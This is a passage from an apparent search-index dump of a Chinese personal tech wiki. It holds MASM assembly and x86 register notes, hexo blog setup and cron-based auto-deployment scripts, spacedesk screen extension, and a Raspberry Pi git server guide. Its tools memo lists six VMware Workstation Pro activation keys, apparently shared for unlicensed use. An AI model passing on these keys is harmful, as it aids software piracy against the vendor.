world&quot;,0;数据段，声明多大整多大;定义数据，可读可写，程序直接放在内存里;.data?：不会占用exe的大小，是程序运行的时候申请的;.const：常量，可读不可写.codemain proc;入口点需要自己指定;函数体，可以加参数 mov eax ,5 mov ebx ,6 add eax ,ebx add eax ,Number push 0 push offset text push offset text push 0 call MessageBoxA sub esp ,16 call ExitProcessmain ENDP;结束函数END main;结束程序流程;代码段，所有指令都要写在代码段中;数据段不可执行，代码段可执行 汇编基本元素整数常量 十六进制: 012h 八进制: 12q 十进制: 12d 二进制: 101010b 字符常量 ‘A’ 字符串常量 “asdad” ‘asdasd’ 保留字 指令：mov,lea…. 寄存器：eax,ebx…. 属性：db,dword… 运算符 标识符 只能以下划线字母开头 不能与保留字相同 伪指令 .data offset,invoke 指令 mov eax,12 注释 ; 数据类型整数 byte 8 位 无符号 sbyte 8 位 有符号 word 16位 无符号 sword 16位 有符号 dword 32位 无符号 sdword 32位 有符号 fword 48位 有符号 用于保护模式的远指针 qword 64位 整数 tbyte 80位 整数 实数（浮点数） real4 32位 短实数 real8 64位 长实数 real10 80位 扩展实数 伪指令 db 8位整数 类似c的char 可以保存ASCII dw 16位整数 dd 32位整数或实数 dq 64位整数或实数 dp 80位整数或实数 伪指令&amp;运算符offset 获取偏移量 [地址]是获取地址中的值 ptr：选择“位数”的值，也就是获取值的一部分 type：获取类型的大小 type lengthof：计算数组元素 mov eax ,offset lengthof arr sizeof:数组占用空间 typedef：类似于C语言 pbyte typedef ptr byte 给变量一个别称","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"常用工具备忘录","date":"2020-04-04T03:21:13.000Z","path":"wiki/备忘笔记/常用工具汇总/","text":"常用工具备忘录编程类Visual Studio 2015适用平台：Windows 下载地址：https://msdn.itellyou.cn/ 选择功能：在默认配置的基础上， 勾选编程语言中 的 Visual C++和针对 Visual Studio 的 Python 工具 勾选通用Windows应用开发工具 做图类：ProcessOn适用平台：全平台 Web在线工具：https://www.processon.com/ 高效办公类：Spackdesk适用平台：Windows，macOS 官网：https://spacedesk.net/ 简介：Windows下的软件扩展桌面解决方案 Microsoft To Do适用平台：Windows，Android 下载地址：Microsoft应用商店 简介：挺好用的清单软件 Vmware Workstation Pro下载地址： https://www.vmware.com/go/getworkstation-win https://www.vmware.com/go/getworkstation-linux 激活密钥： ZC10K-8EF57-084QZ-VXYXE-ZF2XF UF71K-2TW5J-M88QZ-8WMNT-WKUY4 AZ7MK-44Y1J-H819Z-WMYNC-N7ATF CU702-DRD1M-H89GP-JFW5E-YL8X6 YY5EA-00XDJ-480RP-35QQV-XY8F6 VA510-23F57-M85PY-7FN7C-MCRG0","tags":[],"categories":[{"name":"备忘笔记","slug":"备忘笔记","permalink":"http://kn0sky.com/categories/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/"}]},{"title":"内存","date":"2020-04-02T12:27:19.000Z","path":"wiki/学习笔记/原理笔记/内存/","text":"内存冯诺依曼中用来存储程序和数据的部件叫做存储器，存储器分为主存储器（内存储器）和辅助存储器，主存储器也叫内存 内存的寻址范围32位系统内存的寻址范围是0x00000000-0xFFFFFFFF 最大寻址范围：0xFFFFFFFF+1(4294967296) 1 Byte = 8 bit 1 KB = 1024 Byte 1 MB = 1024 KB 1 GB = 1024 MB 4294967296 Byte = 4 GB （32位系统最大内存是4 GB） 64位系统内存寻址范围：0x0000000000000000 – 0xFFFFFFFFFFFFFFFF 内存和寄存器的区别内存：数量庞大，便宜，速度较慢 寄存器：数量少，昂贵，速度极快，位于CPU内部 内存的5种表现形式立即数： 1MOV EAX,DWORD PTR DS:0x????????] 把后面这个内存给EAX 寄存器： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX] 寄存器+立即数： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX + 4] 比例因子： 1[REG + REG * &#123;1,2,4,8&#125;] 数组元素地址 = 数组首地址 + 元素索引 * 数组元素占用空间 123MOV EAX ,0x????????MOV EBX ,0x2MOV ECX ,DWORD PTR DS:[EAX+EBX*4] 比例因子+立即数： 123MOV EAX,0x????????MOV EBX,0x2MOV ECX,DWORDPTRDS:[EAX + EBX*4 +1] 数据存储模式大端序：数据高位在内存低位，数据低位在内存高位，常用于ARM架构 小端序：数据高位在内存高位，数据低位在内存低位，常用于x86、AMD64架构","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"原理笔记","slug":"学习笔记/原理笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/"}]},{"title":"寄存器逻辑结构","date":"2020-03-31T05:21:13.000Z","path":"wiki/学习笔记/原理笔记/寄存器逻辑结构/","text":"寄存器逻辑结构EAX：累加器，操作数和结果数据累加器，返回值运算结果一般都存在这里 64:RAX 32:EAX 16:AX 8:AH+AL EBX：基地址，DS段的数据指针，在内存寻址的时候存放基地址 64:RBX 32:EBX 16:BX 8:BH+BL ECX：计数器，字符串和循环操作的计数器 64:RCX 32:ECX 16:CX 8:CH+CL EDX：存储部分乘法结果和部分除法被除数 64:RDX 32:EDX 16:DX 8:DH+DL EBP：基址指针，SS段的数据指针 64:RBP 32:EBP 16:BP ESP：栈帧指针，指向栈顶，也叫栈顶指针 64:RSP 32:ESP 16:SP EDI：字符串操作的目标指针，ES段的数据指针 64:RDI 32:EDI 16:DI ESI：字符串操作的原始指针，SS段的数据指针 64:RSI 32:ESI 16:SI","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"原理笔记","slug":"学习笔记/原理笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础01：基础概念","date":"2020-03-30T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础01--基础概念/","text":"汇编基础01：基础概念汇编语言为什么要学汇编 开发 高级语言内联汇编 Windows内核编程 逆向分析（需要精通汇编） 汇编语言与机器语言的区别 汇编语言是机器语言的助记符，几乎是一一对应的 16/32/64位汇编的区别 16位汇编：实模式，16位处理器内部，最多处理存储长度为16位 32位汇编：保护模式，32位处理器内部，最多处理存储长度为32位 64位汇编：保护模式，64位处理器内部，最多处理存储长度为64位 16位处理器只能运行16位汇编， 64位处理器可以运行64和32位汇编， 32位处理器不能运行16位汇编， 因为模式不一样 基本执行环境32位： 8个32位通用寄存器 标志寄存器：EFLAGS 指令指针寄存器：EIP（记录下一条执行的地址） 64位： 8个64位通用寄存器 标志寄存器：RFLAGS 指令指针寄存器：RIP（记录下一条执行的地址） EFLAGS 寄存器包含了独立的二进制位，用于控制CPU操作，或反应CPU执行的结果 VS中的标志位 MMX 寄存器MMX 寄存器实际上是浮点单元中使用的同样寄存器的别名 XMM 寄存器SIMD的扩展指令集 环境配置 Ollydbg Visual Studio 2015 新建空项目 选中项目右键“生成自定义”，选择MASM生成规则 新建一个.asm后缀的新文件 选中项目右键–属性–链接器–系统–子系统选&lt;控制台(SUBSYSTEM:CONSOLE)&gt; 选中项目右键–属性–链接器–高级–入口点–填写 “main” 寄存器逻辑结构EAX：累加器，操作数和结果数据累加器，返回值运算结果一般都存在这里 64:RAX 32:EAX 16:AX 8:AH+AL EBX：基地址，DS段的数据指针，在内存寻址的时候存放基地址 64:RBX 32:EBX 16:BX 8:BH+BL ECX：计数器，字符串和循环操作的计数器 64:RCX 32:ECX 16:CX 8:CH+CL EDX：存储部分乘法结果和部分除法被除数 64:RDX 32:EDX 16:DX 8:DH+DL EBP：基址指针，SS段的数据指针 64:RBP 32:EBP 16:BP ESP：栈帧指针，指向栈顶，也叫栈顶指针 64:RSP 32:ESP 16:SP EDI：字符串操作的目标指针，ES段的数据指针 64:RDI 32:EDI 16:DI ESI：字符串操作的原始指针，SS段的数据指针 64:RSI 32:ESI 16:SI 冯·诺依曼体系结构分为5个部分 输入设备–存储器–输出设备，运算器–控制器 内存冯诺依曼中用来存储程序和数据的部件叫做存储器，存储器分为主存储器（内存储器）和辅助存储器，主存储器也叫内存 内存的寻址范围32位系统内存的寻址范围是0x00000000-0xFFFFFFFF 最大寻址范围：0xFFFFFFFF+1(4294967296) 1 Byte = 8 bit 1 KB = 1024 Byte 1 MB = 1024 KB 1 GB = 1024 MB 4294967296 Byte = 4 GB （32位系统最大内存是4 GB） 64位系统内存寻址范围：0x0000000000000000 – 0xFFFFFFFFFFFFFFFF 内存和寄存器的区别内存：数量庞大，便宜，速度较慢 寄存器：数量少，昂贵，速度极快，位于CPU内部 内存的5种表现形式立即数：就是阿拉伯数字 1MOV EAX,DWORD PTR DS:0x????????] 把后面这个内存给EAX 寄存器： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX] 寄存器+立即数： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX + 4] 比例因子： 1[REG + REG * &#123;1,2,4,8&#125;] 数组元素地址 = 数组首地址 + 元素索引 * 数组元素占用空间 123MOV EAX ,0x????????MOV EBX ,0x2MOV ECX ,DWORD PTR DS:[EAX+EBX*4] 比例因子+立即数： 123MOV EAX,0x????????MOV EBX,0x2MOV ECX,DWORDPTRDS:[EAX + EBX*4 +1] 数据存储模式大端序：数据高位在内存低位，数据低位在内存高位，常用于ARM架构 小端序：数据高位在内存高位，数据低位在内存低位，常用于x86、AMD64架构 操作数类型立即数：数字 imm 立即数 imm8 imm16 imm32 寄存器操作数 reg 通用寄存器 reg8 reg16 reg 32 sreg 段寄存器 内存操作数 mem 内存 mem8 mem16 mem 32 参考资料 EFLAGS寄存器中状态标志（Status Flags）小结 x86—EFLAGS寄存器详解","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"借助云服务器实现hexo全自动部署","date":"2020-03-15T14:36:10.000Z","path":"wiki/折腾笔记/博客搭建/借助云服务器实现hexo全自动部署/","text":"借助云服务器实现hexo全自动部署大家好，我是kn0sky，上一篇我们用hexo搭建了wiki主题个人博客，这次我们来讲讲部署hexo文章我们可以如何偷懒。不想直接把站点文件都传到github上，那自己发布hexo文章需要依次执行3条命令，懒惰的我觉得太麻烦了，于是简单写了个脚本将三条hexo命令简化成一条执行脚本命令，但发布文章还是要执行一条命令啊，还是太麻烦了，后来就在想啊，能不能一条命令也不用输入，完全自动发布文章呢，于是有了本文。 本文的实现思路如下：通过云服务器的定时任务以及和云服务器的实时同步文件来实现全自动部署工作。 本文内容分为如下几部分： 云服务器安装hexo 实现与云服务器的文件实时同步 云服务器定时部署到github page 云服务器安装Hexo安装git和Node.JS首先通过ssh连接到云服务器，具体操作自行百度 我这里使用的云服务器系统是Ubuntu Linux系统，所以本文以Ubuntu Linux为例进行讲解 Ubuntu Linux默认自带git，所以我们还需要自行安装一下Node.JS： 12345678$ wget https://nodejs.org/dist/v12.16.1/node-v12.16.1-linux-x64.tar.xz$ tar -xvf node-v12.16.1-linux-x64.tar.xz $ sudo mv node-v12.16.1-linux-x64 /usr/local/node-v12$ sudo ln -s /usr/local/node-v12/bin/node /bin/node$ sudo ln -s /usr/local/node-v12/bin/npm /bin/npm# 可使用如下命令检测node是否安装成功$ node -v$ npm -v 如果该云服务器是第一次使用git，记得添加一下名称和邮箱 12$ git config --global user.name \"Your Name\"$ git config --global user.email \"email@example.com\" 安装Hexo1234$ npm install -g hexo-cli$ sudo ln -s /usr/local/node-v12/bin/hexo /bin/hexo# 检测hexo是否安装成功$ hexo -v 运行Hexo我们需要先初始化一个hexo目录 1$ hexo init &lt;floder name&gt; 初始化完成后，文件夹结构如下： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 其中_config.yml为站点配置文件，themes为主题文件目录 要运行hexo,在hexo的目录下使用如下命令即可： 123$ hexo server# 或者$ hexo s 启动服务器后，默认在4000端口启动web服务，此时访问&lt;ip&gt;:4000即可访问到当前hexo站点，此时站点里默认会有一篇快速入门的文章帮助你快速熟悉hexo的使用 想将自己的hexo博客设置成wiki样式，可参考我的上篇文章《使用hexo搭建wiki》进行配置 将本地配置好的wiki移动到云服务器将本地配置好的服务器打包，上传到云服务器，然后解压即可直接使用，有的插件可能要再次npm装一下 实现到云服务器之间的文件实时同步为了方便我们写文章在本地保存完就直接同步到服务器上，我们可以想办法实现一下文件实时同步，将本地文件夹的修改实时同步到云服务器上，这里有一个现成的解决方案：使用坚果云实时同步文件夹。 这里我们使用坚果云软件，我们的主机上下载好坚果云软件，注册登录，建立一个同步文件夹，这里操作很无脑，就不演示了，接下来讲讲没有图形界面的Linux命令行如何同步坚果云： 坚果云提供WebDav接口，这里可以使用davfs工具去挂载WebDav目录 WebDav:WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。有利于用户间协同编辑和管理存储在万维网服务器文档 总之，就是常用于网盘的一种网络协议。 davfs:一种连接WebDav网盘的工具 安装davfs21$ sudo apt install davfs2 配置&amp;挂载davfs2编辑配置文件/etc/davfs2/davfs2.conf，找到如下内容将注释去掉，将0改成1 1# ignore_dav_header 0 编辑配置文件/etc/davfs2/secrets，在配置文件最后添加如下内容： 1https:&#x2F;&#x2F;dav.jianguoyun.com&#x2F;dav 你的坚果云账户 你的webdav应用密码 坚果云WebDav应用密码获取方式： 坚果云官网登录你的坚果云账号 依次点击账户信息—安全选项，即可看到添加WebDav应用的按钮 点击添加应用，名称随意输入，然后就会自动生成一个密码 然后进行挂载 1$ sudo mount.davfs https://dav.jianguoyun.com/dav 你想要挂载的目录 接下来访问该目录即可发现目录里的内容已经和我们坚果云账号创建的实时同步文件夹同步了 接下来，我们将我们的hexo主目录source文件下的_post目录放到我们的坚果云实时同步文件夹下，然后在云服务器软链接（ln -s）到云服务器hexo目录的该位置即可，过于简单就不演示了 到此为止，我们在本地写完文章保存后，云服务器会自动同步文章，接下来在云服务器后台启动hexo s即可实时展示博客更新的内容了： 12$ cd 你的hexo的目录$ nohup /bin/hexo server &gt;&gt; ~/hexo.log 2&gt;&amp;1 &amp; 命令含义详见参考资料 通过脚本生成新的文章模板每次创建新的文章都需要通过命令hexo new name进行，hexo程序为我们生成一个文章模板，但是如果我想只在远程服务器上安装hexo，不想在本地安装hexo呢，这里我们通过一个脚本来实现hexo new的功能，这样即使本地没有hexo，也能写hexo的文章，这里直接给出代码了： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/pythonimport sysimport timeimport osif not sys.argv[1]: print(\"请输入文章标题\") print(\"例如：python hexonew.py title\") sys.exit()title = sys.argv[1]time = time.strftime(\"%Y-%m-%d %H:%M:%S\",time.localtime())header = f\"\"\"---title: &#123;title&#125; toc: truedate: &#123;time&#125;tags:categories:--- \"\"\"footer = \"\"\"## 参考资料&gt; - []()&gt; - []()\"\"\"text = header + '\\n' + footerurl = os.getcwd() + '/' + title + '.md'with open(url,'w') as f: f.write(text) 通过脚本和命令实现全自动化部署到Github Page为了全自动部署到Github Page，我们可以使用Linux的定时任务，比如每天晚上12点进行一次部署，部署的命令我们写成脚本方便一键执行，这样一来，我们只需要写完内容，然后保存，就能全自动部署到我们的博客上了，而且我们可以在任何机器上写文章，甚至不需要安装任何环境，非常方便。 配置云服务器ssh秘钥连接github生成ssh秘钥 1$ ssh-keygen -t rsa -C \"github邮箱账号\" 找到生成的秘钥，将公钥内容复制，在github上个人设置–SSH and GPG keys–New SSH key添加秘钥 添加完秘钥可使用如下命令测试: 1$ ssh -T git@github.com 这里我遇到了一个错误：git@github.com: Permission denied (publickey)，解决方案我放在参考资料里了。 连接成功的话，会返回类似如下字样： 1Hi kn0sky! You&#39;ve successfully authenticated, but GitHub does not provide shell access. 此时我们到hexo主目录使用一下hexo d命令试一试，此时我们无需输入账号密码即可成功部署 一键脚本使用一键部署脚本便于定时任务的设置，这里使用shell脚本进行部署 不知道什么原因，云服务器的hexo s启动服务器不会因为坚果云同步目录的变更而更新内容，所以这里也定时重启好了 PS：目录地址需要根据自己的情况进行修改 重启脚本： 1234567891011#!/bin/bashcd ~/hexo-wikinum=`ps -elf | grep hexo | grep -v grep | wc -l`if [ $&#123;num&#125; -ne 0 ];then ps -elf | grep hexo | grep -v grep | awk '&#123;print $4&#125;' | xargs kill -9 echo \"[+]已杀死进程\" &gt;&gt; ~/hexo.logfiecho \"--------------\" &gt;&gt; ~/hexo.logecho `date -d now` &gt;&gt; ~/hexo.lognohup /bin/hexo server -p 30808 &gt;&gt; ~/hexo.log 2&gt;&amp;1 &amp; 部署脚本： 123456#!/bin/bashcd ~/hexo-wikinohup hexo clean &amp;&amp; hexo g &amp;&amp; hexo d &gt;&gt; ~/crontab_script/hexo_auto_depoly.log 2&gt;&amp;1 &amp;echo '-----------------------'echo `date -d 'now'` &gt;&gt; ~/crontab_script/blog_auto_deploy.logecho \"[+]完成部署！\" &gt;&gt; ~/crontab_script/blog_auto_deploy.log 这里使用git进行自动部署，git会自动检测提交的内容同上次提交相比是否有变更，如果有，就部署，反之，不部署。 设置定时任务使用crontab工具设置定时任务，使用如下命令进入编辑页面 1$ crontab -e 在配置的最底下添加如下内容： 1234# 每天9点12分的时候运行部署脚本12 9 * * * bash ~/crontab_script/blog_auto_deploy.sh# 每15分钟运行一次hexo 服务重启脚本*/15 * * * * bash ~/crontab_script/blog_auto_server.sh 到此，基本实现hexo全自动部署功能！ 希望对读完的你有所帮助。 参考资料 使用hexo搭建个人wiki 备份Linux操作系统的数据到坚果云的方法 搭建 Node.js 环境 linux shell中”2&gt;&amp;1”含义 nohup和&amp;后台运行，进程查看及终止 git@github.com: Permission denied (publickey) Linux crontab 命令","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"博客搭建","slug":"折腾笔记/博客搭建","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"使用手机扩展电脑屏幕","date":"2020-03-13T10:38:51.000Z","path":"wiki/折腾笔记/手机连接电脑/使用手机扩展电脑屏幕/","text":"Windows 下 使用手机 进行 屏幕扩展多屏幕协同工作可以有效提高工作效率，在一定程度上摆脱窗口反复切换的问题，下面将分别介绍常规和非常规的解决方案。 常规解决方案最常规的方法是整一个显示设备（显示器、投影仪等），HDMI线缆连接，然后显示设置里选择扩展屏幕（也有复制选项） 非常规解决方案通过局域网使用手机/平板/其他Windows电脑进行屏幕扩展这里需要通过spacedesk软件实现，下载地址参考：spacedesk官网 软件分为主机端和扩展端，主机端只能是Windows系统，扩展端可以是Android、Windows、iOS等 软件的安装较为无脑，直接点下一步即可，这里不多啰嗦，Android端apk打不开Google Play商店可通过其他下载站进行下载，例如Freeapk 软件安装完之后，主机和用于扩展屏幕的设备需处于同一局域网下，主机端打开软件，扩展端也打开软件，扩展端会直接在局域网内搜索主机，然后选中要使用扩展的主机即可 PS： Windows系统查看 IP 地址可通过 cmd 命令进行查询： 快捷键Windows + R打开运行 输入 cmd 敲击回车，弹出黑框框 输入ipconfig命令敲击回车，即可查询当前IP 注意：如果手机和电脑分辨率不一样会导致扩展屏的使用体验很糟糕！","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"手机连接电脑","slug":"折腾笔记/手机连接电脑","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/"}]},{"title":"使用hexo搭建个人wiki","date":"2020-03-12T11:38:51.000Z","path":"wiki/折腾笔记/博客搭建/使用hexo搭建wiki/","text":"Hexo及其环境的安装安装Hexo需要Node.js和Git环境，Hexo安装方法和过程参考官方文档 初始化hexo文件夹：1$ hexo init &lt;floder_name&gt; 初始化完成后，文件夹结构如下： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 其中_config.yml为站点配置文件，themes为主题文件目录 hexo的快速入门创建新文章1$ hexo new \"My New Post\" More info: Writing 运行服务器1$ hexo server More info: Server 生成静态文件1$ hexo generate More info: Generating 部署到远程站点1$ hexo deploy More info: Deployment PS：Hexo建站各种基本使用方法请参考官方文档 Hexo安装Wikitten主题：PS:这里主题使用相关内容均来自Wikitten主题的文档 安装过程如下： 进入你的hexo文件夹，将主题克隆到themes/路径下 12$ cd your-hexo-directory$ git clone https://github.com/zthxxx/hexo-theme-Wikitten.git themes/Wikitten 覆盖站点目录中的默认页面模板 12$ cp -rf themes/Wikitten/_source/* source/$ cp -rf themes/Wikitten/_scaffolds/* scaffolds/ 重命名主题中的 _config.yml.example 到 _config.yml，然后可以使用配置文件配置主题 123$ cp -f themes/Wikitten/_config.yml.example themes/Wikitten/_config.yml# 编辑配置文件，定制你的配置项$ vim themes/Wikitten/_config.yml 安装插件 12345hexo-autonofollow // 打开非本站链接时自动开启新标签页hexo-directory-category // 根据文章文件目录自动为文章添加分类hexo-generator-feed // 生成 RSS 源hexo-generator-json-content // 生成全站文章 json 内容，用于全文搜索hexo-generator-sitemap // 生成全站站点地图 sitemap 安装命令： 1$ npm i -S hexo-autonofollow hexo-directory-category hexo-generator-feed hexo-generator-json-content hexo-generator-sitemap 到这里我们的个人wiki版的hexo站点已经可以运行了，接下来我们需要做一些定制化的配置： 添加插件的配置内容：向站点配置文件（hexo根目录下的_config.yml文件）最后添加如下内容 123456789101112131415161718192021222324252627282930313233## Markdown## https://github.com/hexojs/hexo-renderer-markedmarked: gfm: true ## Plugins: https://hexo.io/plugins/### JsonContentjsonContent: meta: false pages: title: true date: true path: true text: true posts: title: true date: true path: true text: true tags: true categories: true ignore: - 404.html ### Creat sitemapsitemap: path: sitemap.xml### Adds nofollow attribute to all external links in your hexo blog posts automatically.nofollow: enable: true exclude: - &lt;your site url domain&gt; # eg: zthxxx.me 到这里，我们的wikitten主题的hexo站点已经成功搭建完成 一些个人定制化配置（可选）修改代码块颜色这个主题启用之后，默认代码块的背景颜色是黑色，纯白色的背景配纯黑的代码块背景颜色有点看着不舒服，所以我想将代码块颜色进行修改。 找到主题配置文件找到如下行： 1highlight: monokai 将monokai改成自己想要的主题即可，本站使用的风格是`` PS：可用主题名称可于Wikitten/source/css/_highlight目录下找到，highlightjs网站可进行在线预览。 启用资源文件夹编写.md格式文档过程中，图片的插入是个问题，我们可以引用外部链接，也可以使用本地图片，如果不想使用远程图床的话，这里启用资源文件夹更加便于在文档中插入图片 在站点配置文件夹中，找到如下配置选项，将false改为true即可 1post_asset_folder: false 接下来使用命令(hexo new title)创建新文档的时候，就会自动创建一个资源文件夹 PS：由于之前开启了自动以文件夹来创建分类，所以我们使用资源文件夹的时候，文件夹里不要出现.md文件，不然文件夹也会被认为是一个文章分类 部署到Github Page手动部署这里有两个地方要操作，一个是github，一个是本地配置文件 github创建github page仓库 创建github账号 创建个人仓库，仓库名为用户名.github.io 配置部署到github 安装 hexo-deployer-git 1$ npm install hexo-deployer-git --save 编辑站点配置文件，找到如下内容： 1234# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: '' 按照如下格式进行修改： 1234deploy: type: git repo: &lt;repository url&gt; branch: master repo：github仓库的url（例如:https://github.com/username/username.github.io.git） branch：分支名称(一般是master) 然后使用如下命令进行部署 1$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d 命令执行完成后会提示你输入github账号密码，输入完即完成了提交 接下来可从username.github.io访问到自己的博客了 免密码部署设置 创建SSH密匙 1ssh-keygen -t rsa -C \"GitHub 邮箱\" 复制公钥（生成的.pub的文件）的内容到github–setting–SSH and GPG keys中（标题随便起） 修改站点配置文件，将前面我们的repo改成ssh地址，格式例如： 1234deploy: type: git repository: git@github.com:myname/myname.github.io.git branch: master 然后我们再次使用hexo d进行部署，就不再需要我们填写用户名和密码了 使用脚本一键部署每次部署都需要三条命令，过于麻烦，我们可以写个脚本将三条命令进行简化 以下脚本均放在站点主目录下 shell脚本 12#!/bin/bashhexo clean &amp;&amp; hexo g &amp;&amp; hexo d python脚本 12345#!/usr/bin/python3import osos.system('hexo clean')os.system('hexo g')os.system('hexo d') 设置自定义域名我们也可以使用我们自己的域名来访问我们的博客，首先，我们需要先注册一个域名（比如，可以去腾讯云注册） 然后在我们博客的github仓库设置自定义域名为我们想要访问解析的域名，同时在我们注册域名的地方设置CNAME解析地址为:username.github.io. 稍等片刻即可通过自定义域名访问博客了 不过这里会出现一个问题就是每次部署都会导致CNAME信息需要重新设置，这里我们需要在站点主目录的source目录下创建个CNAME文件，里面写上自己要解析的地址即可 自动化部署到Github Page 使用Travis CI 将 Hexo 博客部署到 GitHub Pages 上可实现自动化部署，只需要我们将站点文件push到github上，即可自动部署成博客 如果不希望自己的站点文件公开的话，还是建议使用上面的手动部署方法 详细教程请参考hexo相关文档 More info: deploy to github page 参考资料 Hexo-Theme-Wikitten中文文档 Hexo文档","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"博客搭建","slug":"折腾笔记/博客搭建","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"让树莓派有点事做04--git服务器","date":"2019-08-04T01:36:11.000Z","path":"wiki/折腾笔记/树莓派/让树莓派有点事做04--git服务器/","text":"让树莓派有点事做04–git服务器前言git是一款方便好用的版本控制工具，配置git服务不需要专门准备服务器，只要那个服务器有足够的空间即可，这对于性能不高的树莓派来说，真是一个好东西 git虽然是版本控制工具，但是还可以用来进行文件共享等其他操作，树莓派+git服务在局域网里传输小文件就显得轻量很多，比搭建网盘之类的还要方便快捷 而且git在windows，Linux，mac系统上都可以使用 下面进入搭建环节： 使用树莓派搭建git服务器我这里使用的树莓派是树莓派3B+版本（现在以及有新版树莓派4B了，新版树莓派性能要高很多，不过搭建git服务都差不了太多） 接下来我们开始吧：安装git 通过ssh连接到我们装好系统的树莓派上 安装git（git服务端和客户端的安装是一样的）1sudo apt install git 配置git服务器 创建一个文件夹作为git仓库，修改仓库的权限123sudo mkdir /gitsudo chown user:user /git/# 这里的user是用户名称，把属主属组设置为自己 使用git初始化文件夹1234cd /git# 进入git文件夹git init --bare file.git# 初始化一个空的仓库，名为file.git，一般git仓库以.git结尾 git仓库创建完毕 远程连接树莓派的git仓库上传文件 通过另一台设备使用git去clone树莓派的仓库12git clone pi@&lt;repo-ip&gt;:/git/file.git master# pi是树莓派的用户名，后面跟树莓派的IP和git仓库的位置，和分支，即可clone成功 进入我们刚刚clone的空仓库，创建几个文件，进行上传12345cd mastertouch test.txtgit add .git commit -a -m \"test\"git push 上传成功clone完空仓库之后，./.git/config文件会记录仓库信息，下次拉取仓库内容的时候，可以直接git pull，不用再加地址信息了 到这里，基本的git服务器已经配置完成了,可以正常使用了 搭建gitweb有时候，如果能够通过一个可视化界面看看我们仓库里装了啥或者装的东西，会很方便git原生自带了一个web界面，通过这个web界面，我们不用登陆也可以拉取仓库里的文件（在宿舍给舍友分享文件也可以这么干） 安装搭建gitweb 安装一个web服务，这里用默认的lighttpd来进行：1sudo apt install lighttpd 安装gitweb1sudo apt install gitweb 运行gitweb1234cd /git/file.git#进入仓库目录git instaweb --start# 启动gitweb，可以通过-p参数设置端口，默认1234 访问gitweb 通过浏览器访问&lt;raspberryPi-ip&gt;:1234 随便上传点啥，看看效果： 在仓库页面点击上面的snapshot按钮可以将整个仓库打包下载下来 补充资料有需要的童鞋可以自取 git的使用：https://kn0sky.com/2019/08/25/git/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%95%99%E4%BD%A0%E5%AD%A6%E4%BC%9A%E4%BD%BF%E7%94%A8git/ 